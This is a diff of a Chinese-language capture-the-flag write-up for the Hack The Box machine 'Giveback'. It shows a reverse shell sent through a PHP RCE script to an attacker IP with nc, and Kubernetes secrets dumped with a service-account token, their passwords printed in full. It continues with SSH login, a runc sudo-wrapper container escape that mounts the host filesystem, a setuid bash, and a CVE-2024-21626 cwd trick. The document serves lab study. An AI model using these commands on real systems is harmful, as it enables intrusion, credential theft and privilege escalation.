@@ -1937,7 +1937,7 @@ I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ php /tmp/rce.php 'whic
 listening on [any] 443 ...
 ```
 ```
-I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ php /tmp/rce.php 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.44 443 >/tmp/f'
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ php /tmp/rce.php 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.139 443 >/tmp/f'
 ```
 #### 获得了 root 权限的 shell：
 #### 使用标准方法升级 shell （但使用 `--install`sh而bash不是 `--install`，因为它尚未安装）：
@@ -2046,8 +2046,7 @@ curl: (6) Could not resolve host: api
 / #  export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
 / # export TOKEN=$(cat ${SERVICEACCOUNT}/token)
 / # export CACERT=${SERVICEACCOUNT}/ca.crt
-/ # alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN
-}\""
+/ # alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN }\""
 / # curl https://$APISERVER/api -k
 {
   "kind": "Status",
@@ -2243,3 +2242,394 @@ curl: (6) Could not resolve host: api
 {"name":"user-secret-babywyrm","keys":["MASTERPASS"]}
 ```
 #### 这些sh.helm.release是产品发布博客，篇幅很长，对我来说没什么用。我会去获取其他数据：
+```
+/var/www/html/cgi-bin # kurl https://$APISERVER/api/v1/namespaces/default/secrets -s | jq '.items[] | select(.metadata.name | startswith("sh.helm") | not) | {name: .metadata.name, data: (.data | map_values(@base64d))}' -c
+{"name":"beta-vino-wp-mariadb","data":{"mariadb-password":"sW5sp4spa3u7RLyetrekE4oS","mariadb-root-password":"sW5sp4syetre32828383kE4oS"}}
+{"name":"beta-vino-wp-wordpress","data":{"wordpress-password":"O8F7KR5zGi"}}
+{"name":"user-secret-babywyrm","data":{"MASTERPASS":"jrTEyZxVvBwHdliXbzsv8EciYowB3llY"}}
+```
+#### 那有两个 MariaDB 密码、一个 WordPress 密码，以及一个名为 babywyrm 的用户的密码。除了这个用户的密码之外，其他的密码我之前都从上面的/secrets目录中见过
+### SSH
+```
+[★]$ netexec ssh giveback.htb -u babywyrm -p jrTEyZxVvBwHdliXbzsv8EciYowB3llY
+[*] Copying default configuration file
+SSH         10.129.242.171  22     giveback.htb     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
+SSH         10.129.242.171  22     giveback.htb     [+] babywyrm:jrTEyZxVvBwHdliXbzsv8EciYowB3llY  Linux - Shell access!
+```
+#### 使用密码登录
+```
+[★]$ ssh babywyrm@giveback.htb
+babywyrm@giveback:~$ cat user.txt
+```
+#### babywyrm 的主目录非常空：
+```
+babywyrm@giveback:~$ find . -type f
+./.wgetrc
+./.bash_logout
+./.profile
+./.sudo_as_admin_successful
+./.cache/motd.legal-displayed
+./.ssh/authorized_keys
+./user.txt
+./.bashrc
+```
+#### 这条NOPASSWD: !ALL规则意味着任何命令都必须输入密码才能运行。结合第二条规则，babywyrm 只能/opt/debug以 sudo 权限运行，并且必须输入密码才能运行
+```
+babywyrm@giveback:~$ cat /etc/passwd | grep 'sh$'
+root:x:0:0:root:/root:/bin/bash
+babywyrm:x:1000:1000:babywyrm:/home/babywyrm:/bin/bash
+babywyrm@giveback:~$ sudo -l 
+Matching Defaults entries for babywyrm on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty, timestamp_timeout=0, timestamp_timeout=20
+
+User babywyrm may run the following commands on localhost:
+    (ALL) NOPASSWD: !ALL
+    (ALL) /opt/debug
+```
+#### 输入了2遍不同的密码，分别是jrTEyZxVvBwHdliXbzsv8EciYowB3llY 、sW5sp4spa3u7RLyetrekE4oS
+```
+babywyrm@giveback:~$ sudo /opt/debug
+[sudo] password for babywyrm: 
+Sorry, try again.
+[sudo] password for babywyrm: 
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+Error: No command specified. Use '/opt/debug --help' for usage information.
+babywyrm@giveback:~$ 
+```
+#### 根据提示使用--help 
+```
+babywyrm@giveback:~$ sudo /opt/debug --help
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+[*] Processing command: --help
+Restricted runc Debug Wrapper
+
+Usage:
+  /opt/debug [flags] spec
+  /opt/debug [flags] run <id>
+  /opt/debug version | --version | -v
+
+Flags:
+  --log <file>
+  --root <path>
+  --debug
+```
+#### 该version命令会提供更多信息：
+```
+babywyrm@giveback:~$ sudo /opt/debug --version
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+[*] Processing command: --version
+runc version 1.1.11
+commit: v1.1.11-0-g4bccb38c
+spec: 1.0.2-dev
+go: go1.20.12
+libseccomp: 2.5.4
+```
+#### 该debug二进制文件看起来像是对runcOCI 容器运行时（Docker/containerd/K8s 在底层使用）的一个受限包装器
+### 直接滥用 runc
+#### runc可以创建容器，所以我将创建一个挂载了主机文件系统的容器，这样我就可以以 root 用户身份进入该容器。
+#### 我首先要创建一个运行目录 | 为容器设置根文件系统：
+```
+babywyrm@giveback:~$ mkdir -p /tmp/runc/rootfs
+babywyrm@giveback:~$ cd /tmp/runc
+
+babywyrm@giveback:/tmp/runc$ cp -aL /bin rootfs/bin
+
+babywyrm@giveback:/tmp/runc$ mkdir rootfs/lib64
+babywyrm@giveback:/tmp/runc$ cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64/
+
+babywyrm@giveback:/tmp/runc$ mkdir rootfs/lib
+babywyrm@giveback:/tmp/runc$ cp -a /lib/x86_64-linux-gnu rootfs/lib
+
+babywyrm@giveback:/tmp/runc$ ls -la rootfs/
+total 36
+drwxrwxr-x 5 babywyrm babywyrm  4096 Mar 26 07:31 .
+drwxrwxr-x 3 babywyrm babywyrm  4096 Mar 26 07:29 ..
+drwxr-xr-x 2 babywyrm babywyrm 20480 Oct 28 12:10 bin
+drwxrwxr-x 3 babywyrm babywyrm  4096 Mar 26 07:32 lib
+drwxrwxr-x 2 babywyrm babywyrm  4096 Mar 26 07:31 lib64
+```
+#### 该runc spec命令将生成默认的 OCI 规范。我可以使用 `sudo config` ，但由于此步骤不需要 root 权限，因此debug我将直接使用 ` sudo config`：runc
+```
+babywyrm@giveback:/tmp/runc$ runc spec //生成一个 OCI 容器运行配置模板
+babywyrm@giveback:/tmp/runc$ ls -l
+total 8
+-rw-rw-r-- 1 babywyrm babywyrm 2500 Mar 26 07:37 config.json //← 容器配置文件（核心！）
+drwxrwxr-x 5 babywyrm babywyrm 4096 Mar 26 07:31 rootfs      //← 容器的根文件系统
+```
+
+<details>
+<summary>babywyrm@giveback:/tmp/runc$ cat config.json</summary>
+
+```
+{
+	"ociVersion": "1.2.1",
+	"process": {
+		"terminal": true,
+		"user": {
+			"uid": 0,
+			"gid": 0
+		},
+		"args": [
+			"sh"
+		],
+		"env": [
+			"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+			"TERM=xterm"
+		],
+		"cwd": "/",
+		"capabilities": {
+			"bounding": [
+				"CAP_AUDIT_WRITE",
+				"CAP_KILL",
+				"CAP_NET_BIND_SERVICE"
+			],
+			"effective": [
+				"CAP_AUDIT_WRITE",
+				"CAP_KILL",
+				"CAP_NET_BIND_SERVICE"
+			],
+			"permitted": [
+				"CAP_AUDIT_WRITE",
+				"CAP_KILL",
+				"CAP_NET_BIND_SERVICE"
+			]
+		},
+		"rlimits": [
+			{
+				"type": "RLIMIT_NOFILE",
+				"hard": 1024,
+				"soft": 1024
+			}
+		],
+		"noNewPrivileges": true
+	},
+	"root": {
+		"path": "rootfs",
+		"readonly": true
+	},
+	"hostname": "runc",
+	"mounts": [
+		{
+			"destination": "/proc",
+			"type": "proc",
+			"source": "proc"
+		},
+		{
+			"destination": "/dev",
+			"type": "tmpfs",
+			"source": "tmpfs",
+			"options": [
+				"nosuid",
+				"strictatime",
+				"mode=755",
+				"size=65536k"
+			]
+		},
+		{
+			"destination": "/dev/pts",
+			"type": "devpts",
+			"source": "devpts",
+			"options": [
+				"nosuid",
+				"noexec",
+				"newinstance",
+				"ptmxmode=0666",
+				"mode=0620",
+				"gid=5"
+			]
+		},
+		{
+			"destination": "/dev/shm",
+			"type": "tmpfs",
+			"source": "shm",
+			"options": [
+				"nosuid",
+				"noexec",
+				"nodev",
+				"mode=1777",
+				"size=65536k"
+			]
+		},
+		{
+			"destination": "/dev/mqueue",
+			"type": "mqueue",
+			"source": "mqueue",
+			"options": [
+				"nosuid",
+				"noexec",
+				"nodev"
+			]
+		},
+		{
+			"destination": "/sys",
+			"type": "sysfs",
+			"source": "sysfs",
+			"options": [
+				"nosuid",
+				"noexec",
+				"nodev",
+				"ro"
+			]
+		},
+		{
+			"destination": "/sys/fs/cgroup",
+			"type": "cgroup",
+			"source": "cgroup",
+			"options": [
+				"nosuid",
+				"noexec",
+				"nodev",
+				"relatime",
+				"ro"
+			]
+		}
+	],
+	"linux": {
+		"resources": {
+			"devices": [
+				{
+					"allow": false,
+					"access": "rwm"
+				}
+			]
+		},
+		"namespaces": [
+			{
+				"type": "pid"
+			},
+			{
+				"type": "network"
+			},
+			{
+				"type": "ipc"
+			},
+			{
+				"type": "uts"
+			},
+			{
+				"type": "mount"
+			},
+			{
+				"type": "cgroup"
+			}
+		],
+		"maskedPaths": [
+			"/proc/acpi",
+			"/proc/asound",
+			"/proc/kcore",
+			"/proc/keys",
+			"/proc/latency_stats",
+			"/proc/timer_list",
+			"/proc/timer_stats",
+			"/proc/sched_debug",
+			"/sys/firmware",
+			"/proc/scsi"
+		],
+		"readonlyPaths": [
+			"/proc/bus",
+			"/proc/fs",
+			"/proc/irq",
+			"/proc/sys",
+			"/proc/sysrq-trigger"
+		]
+	}
+}
+```
+</details>
+
+#### 如果我使用 ` --file` 命令debug，生成的文件将归 root 用户所有且只有 root 用户才能写入。虽然可以通过移动目录并创建一个可编辑的副本来克服这个限制，因为 babywyrm 拥有该目录，所以我可以这样做。但直接运行 `--file` 命令runc更简单。
+#### 将进行修改，在mounts列表中添加以下内容，以便将主机文件系统挂载到容器中的以下位置/hostfs：
+```
+...[SNIP]...
+	"mounts": [
+		{
+			"destination": "/hostfs",           //在容器里，把它放到 /hostfs
+			"type": "bind",           //bind mount（绑定挂载），不是复制，是“直接映射”
+			"source": "/",           //挂载 宿主机的根目录 /
+			"options": ["rbind", "rw"]           //rbind →递归挂载（子目录也带上），rw → 可读可写
+		},
+		{
+			"destination": "/proc",
+...[/SNIP]...
+```
+#### 将启动容器：
+```
+babywyrm@giveback:/tmp/runc$ sudo /opt/debug run syareyaroot
+[sudo] password for babywyrm: 
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+[*] Processing command: run
+Error: Host root filesystem mount detected - not permitted
+```
+#### 该debug二进制文件阻塞了挂载。这在发布版本中可以正常工作，但在 2025 年 11 月的更新日志中添加了一个补丁，增加了这项检查
+```
+	"mounts": [
+		{
+			"destination": "/hostfs",
+			"type": "bind",
+			"source": "/var/..",
+			"options": ["rbind", "rw"]
+		},
+		{
+			"destination": "/proc",
+			"type": "proc",
+			"source": "proc"
+		},
+		{
+			"destination": "/dev",
+```
+#### 主机文件系统挂载为hostfs：
+```
+babywyrm@giveback:/tmp/runc$ sudo /opt/debug run syareyaroot
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+[*] Processing command: run
+[*] Starting container: syareyaroot
+# ls
+bin  dev  hostfs  lib  lib64  proc  sys
+# cd /hostfs/    
+# ls
+bin   cdrom  etc   lib	  lib64   lost+found  mnt  proc  run   srv  tmp  var
+boot  dev    home  lib32  libx32  media       opt  root  sbin  sys  usr
+# cd root
+# ls
+'\'   audit__.sh   coredns   dns.sh   helm   iptables_rules.sh	 python   root.txt
+# cat root.txt
+```
+#### 将从主机获取 root 权限（这样做是-p为了不降低权限）
+```
+# chmod 6777 /hostfs/bin/bash
+# bash -p 
+bash-5.1# id
+uid=0 gid=0 groups=0
+```
+### 另外
+#### 由于 CVE-2024-21626 漏洞，runc容器在设置过程中会泄露指向主机文件系统上某个位置的文件描述符。通过将工作目录设置为主机文件系统上的某个位置/proc/self/fd/7，容器进程启动时其当前工作目录将指向容器外部，即主机目录
+https://nvd.nist.gov/vuln/detail/cve-2024-21626
+```
+babywyrm@giveback:/tmp/0xdf$ vim config.json 
+babywyrm@giveback:/tmp/0xdf$ cat config.json | grep cwd
+                "cwd": "/proc/self/fd/7",
+
+babywyrm@giveback:/tmp/0xdf$ sudo /opt/debug --log /tmp/log.json run exploit
+```
